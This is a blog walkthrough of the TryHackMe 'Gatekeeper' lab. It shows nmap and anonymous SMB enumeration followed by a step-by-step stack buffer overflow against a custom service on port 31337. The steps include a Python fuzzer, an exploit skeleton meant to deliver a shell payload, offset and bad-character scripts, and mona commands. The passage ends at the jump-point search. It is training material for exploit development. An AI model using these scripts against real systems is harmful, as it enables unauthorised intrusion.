<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="layout-lang" content="en"><meta name="day-prompt" content="d ago"><meta name="hour-prompt" content="hr ago"><meta name="minute-prompt" content="min ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="THM - GateKeeper Walkthrough" /><meta name="author" content="w33vils" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/" /><meta property="og:url" content="https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/" /><meta property="og:site_name" content="w33vil‚Äôs blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-15T08:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM - GateKeeper Walkthrough" /><meta name="twitter:site" content="@w33vils" /><meta name="twitter:creator" content="@w33vils" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"w33vils"},"dateModified":"2020-09-15T08:00:00+03:00","datePublished":"2020-09-15T08:00:00+03:00","description":"Introduction","headline":"THM - GateKeeper Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/"},"url":"https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/"}</script><title>THM - GateKeeper Walkthrough | w33vil's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="w33vil's blog"><meta name="application-name" content="w33vil's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/prof.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">w33vil's blog</a></div><div class="site-subtitle font-italic">Pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/w33vils" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/w33vils" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['uv.w','outlook.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM - GateKeeper Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>THM - GateKeeper Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> w33vils </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 15, 2020, 8:00 AM +0300" >Sep 15, 2020<i class="unloaded">2020-09-15T08:00:00+03:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2053 words">11 min read</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><p>I wrote this walkthrough to help me understand Buffer overflows better, in readiness for my OSCP exam. The room itself is Joe Helle‚Äôs (The Mayor) <em>Gatekeeper</em>. You can access it <a href="https://tryhackme.com/room/gatekeeper">here</a></p><p>I will utilize Python and Mona modules for the buffer overflow as well as manual exploitation where possible (No Metasploit). Enough talk, lets get at it!</p><h2 id="scanning">Scanning</h2><p>We first run an extensive nmap scan against the target:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sCV</span> <span class="nt">-oN</span> initial_scan &lt;target_ip&gt;
</pre></table></code></div></div><p>This will run a TCP scan on the target :</p><p>- <strong>sCV</strong> will execute both the default nmap scripts and add verbosity to the output. -<strong>oN</strong> will output the scan result in the normal format.</p><h2 id="enumeration">Enumeration</h2><p>There are a number of ports open, Notably: 135, 139, 445, 3389 and 31337</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/thm/offsec/gatekeeper# nmap <span class="nt">-sCV</span> <span class="nt">-oA</span> initial_scan 10.10.126.1
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-13 07:13 EDT
Nmap scan report <span class="k">for </span>10.10.126.1
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-10-13T11:16:20+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
....
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm<span class="p">;</span><span class="nv">branch</span><span class="o">=</span>foo
|     Hello From: &lt;sip:nm@nm&gt;<span class="p">;</span><span class="nv">tag</span><span class="o">=</span>root
|     Hello To: &lt;sip:nm2@nm2&gt;
....
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
</pre></table></code></div></div><p>Ports 135, 139 and 445 , indicate SMB is running. We will enumerate this for any null shares, but first, lets check out port 31337, which seems to be running a custom application.</p><h3 id="enumerating-port-31337">Enumerating Port 31337</h3><p>We can interact with it using <code class="language-plaintext highlighter-rouge">netcat</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc &lt;ip&gt; 31337
</pre></table></code></div></div><p>We get :</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper_netcat.png" alt="" /></p><p>We notice that we can send commands and the application will either echo it back, or reply with a custom response. We can try to send a bigger string of data, more than the application can handle and we immediately notice the application crashes, confirming a buffer overflow vulnerability.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper_buffer_confirmation.png" alt="" /></p><p>From the above image, we notice the application does not respond when a large input is supplied.</p><h3 id="smb-enumeration">SMB Enumeration</h3><p>We can use <code class="language-plaintext highlighter-rouge">smbclient</code> to list shares as below:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> &lt;ip&gt;
</pre></table></code></div></div><p>We see we can enumerate the shares below as a null user: <img data-proofer-ignore data-src="/assets/img/images/gatekeeper/smbclient.png" alt="" /></p><p>The <code class="language-plaintext highlighter-rouge">Users</code> share looks interesting. We still use <code class="language-plaintext highlighter-rouge">smbclient</code> to access it anonymously. Once inside, we find another interesting <code class="language-plaintext highlighter-rouge">share</code> folder. Inside it, we get an application, ‚Äògatekeeper.exe‚Äô which we transfer to our kali.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/smbclient_2.png" alt="" /></p><h2 id="buffer-overflow-exploitation">Buffer Overflow Exploitation</h2><p>We transfer the exe to a Windows machine where we have <a href="https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Fcorelan%2Fmona">Mona</a> and <a href="https://medium.com/r/?url=https%3A%2F%2Fwww.immunityinc.com%2Fproducts%2Fdebugger%2F">Immunity Debugger</a> installed, so we can play with it and find the right way to exploit it. For my case, I have installed Immunity Debugger on a Windows 7 machine, and added mona.py to the PyCommands folder under the Immunity Debugger installation path.</p><p>Once the environment is setup, we run Immunity Debugger as Administrator and then load/open the exe and run it. Ensure the Firewall allows access to external communications.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/loading_application.png" alt="" /></p><p>Equally, we set the Mona working folder with the following command¬†:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona config -set workingfolder c:\mona\%p
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/setting_mona.png" alt="" /></p><p>From here, we follow the steps below to exploit the Buffer Overflow.</p><ul><li>Fuzz the application<li>Determine the offset<li>Find Bad Characters<li>Find the Jump point<li>Develop the exploit<li>Run the exploit.</ul><h3 id="fuzzing">Fuzzing</h3><p>We will utilize the Python Script below to send a series of ‚ÄúA‚Äù to the machine to replicate the earlier crash. Take a note at the buffer size where it crashes.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>
<span class="c1">#Enter your Windows IP
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.88.131</span><span class="sh">"</span> 
<span class="c1">#Enter Port
</span><span class="n">port</span> <span class="o">=</span>  <span class="mi">31337</span>
<span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">counter</span> <span class="o">=</span> <span class="mi">100</span>
<span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">:</span>
    <span class="nb">buffer</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">counter</span><span class="p">)</span>
    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">100</span>
<span class="k">for</span> <span class="n">string</span> <span class="ow">in</span> <span class="nb">buffer</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
        <span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuzzing with %s bytes</span><span class="sh">"</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">string</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Could not connect to </span><span class="sh">"</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div><p>The script creates a TCP connection to the Windows 7 machine on the port 31337, with the application running inside immunity debugger, and then sends the character string, 100 bytes at a time, until it crashes.</p><p>On running, we see it crashes after 200 bytes have been sent.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/fuzzing.png" alt="" /></p><h3 id="offset">Offset</h3><p>The reason to finding the offset is so that we are able to control the EIP(Extended Instruction Pointer), which in essence tells the computer where to go next to execute a command. By controlling this value, we can tell the computer to execute our malicious code instead.</p><p>The final exploit code skeleton is shown below¬†: You can read more about it on <a href="https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2FTib3rius%2FPentest-Cheatsheets%2Fblob%2Fmaster%2Fexploits%2Fbuffer-overflows.rst">Tib3rius Github</a> but basically, it sends a malicious payload to the vulnerable application, at the right offset and return address, to give us a shell on the host.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>
<span class="c1">#Change to your IP
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">x.x.x.x</span><span class="sh">"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">return_addr</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="sh">""</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">return_addr</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Sending evil buffer...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Done!</span><span class="sh">"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Could not connect.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>To find the offset, we first generate a cyclic pattern with a load value of 200 and use it to crush the application.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msf-pattern_create <span class="nt">-l</span> 200
</pre></table></code></div></div><p>Then we use the random pattern created as the payload on the code above. Reload the application on Immunity and ensure it‚Äôs running before launching the script. It should crash the application again.</p><p>We then use Mona with the command below to get the offset, <code class="language-plaintext highlighter-rouge">146</code> in this case.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona findmsp -distance 200
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/offset.png" alt="" /></p><p>Alternatively, you can use <em>msf</em> command below to get the same. For this, you will also need the EIP value from the crashed application:</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/offset_msf.png" alt="" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msf-pattern_offset -l 200 -q 39654138
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/msf_offset_result.png" alt="" /></p><p>Which gives you the same value as Mona.</p><h3 id="finding-bad-characters">Finding Bad Characters</h3><p>Next we find all bad characters which would otherwise make our shellcode not work. For this, we first create a new payload for our exploit script, consisting of all characters, except <code class="language-plaintext highlighter-rouge">\x00</code> which is natively bad. The script below creates that.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="n">Remove</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="s">x</span><span class="sh">"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">{:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">Remove</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="s">x</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">{:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
<span class="nf">print</span><span class="p">()</span>
</pre></table></code></div></div><p>Equally, we now put the correct offset to the exploit code and set our return address to ‚ÄòBBBB‚Äô (for now), to help us confirm if we are still controlling the EIP. We reload the application on the debugger and run the script.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/badchars1.png" alt="" /></p><p>Note the value of ESP, we will use it shortly. EIP shows its BBBB (42424242) indicating we are properly controlling the EIP, since that is the value we set.</p><p>We then use Mona to generate its own set of all characters that it will use to compare. We exclude the \x00 bad char.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona bytearray -b "\x00"
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/bytearray00.png" alt="" /> Not the <em>bytearray.bin</em> location</p><p>Then we run the command below to compare the bad characters from the baseline to the one in the crashed application.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona compare -f c:\mona\gatekeeper\bytearray.bin -a 015D19F8
</pre></table></code></div></div><p>The 015d19f8 is the ESP value we found above. Ensure you change it to yours The output of the command, shows an extra bad char, <code class="language-plaintext highlighter-rouge">\x0a</code>.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/badchars0a.png" alt="" /></p><p>So we regenerate our payload, excluding the extra bad char. Our badchar code generator will now look like¬†:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="n">Remove</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\\</span><span class="s">x0a</span><span class="sh">"</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="s">x</span><span class="sh">"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">{:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">Remove</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="s">x</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">{:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
<span class="nf">print</span><span class="p">()</span>

</pre></table></code></div></div><p>We run it, copy the new payload to our exploit, reload the application on Immunity and run the exploit. Since we now have two bad characters excluded, we also regenerate Mona‚Äôs baseline characters to compare,</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona bytearray -b "\x00\x0a"
</pre></table></code></div></div><p>and then rerun the comparison, replacing with the new ESP value.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona compare -f c:\mona\gatekeeper\bytearray.bin -a &lt;new_address&gt;
</pre></table></code></div></div><p>We get an <em>Unmodified status</em>, indicating we have captured and excluded all the bad characters.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/unmodified.png" alt="" /></p><h3 id="jump-point">Jump Point</h3><p>The mona command below will find the Jump point. The application code will execute until it reaches the <code class="language-plaintext highlighter-rouge">jmp esp</code> point then it will jump to our shellcode. The jmp esp should not contain any badchars, and so we exclude them.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>!mona jmp -r esp -cpb "\x00\x0a"
